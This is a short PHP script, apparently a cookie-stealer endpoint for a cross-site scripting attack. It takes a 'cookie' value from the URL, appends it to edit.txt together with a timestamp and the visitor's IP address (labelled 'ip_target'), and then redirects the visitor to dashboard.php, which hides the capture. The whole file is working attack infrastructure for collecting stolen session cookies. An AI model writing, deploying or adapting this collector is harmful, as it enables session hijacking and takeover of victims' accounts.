<?php
$edit_session = $_GET['cookie'] ?? 'kosong';
$waktu = date('Y-m-d H:i:s');
$ip_target = $_SERVER['REMOTE_ADDR'];

$log = "[$waktu] IP: $ip_target | Edit Session: $edit_session\n";
file_put_contents("edit.txt", $log, FILE_APPEND);

header("Location: dashboard.php");
exit();
?>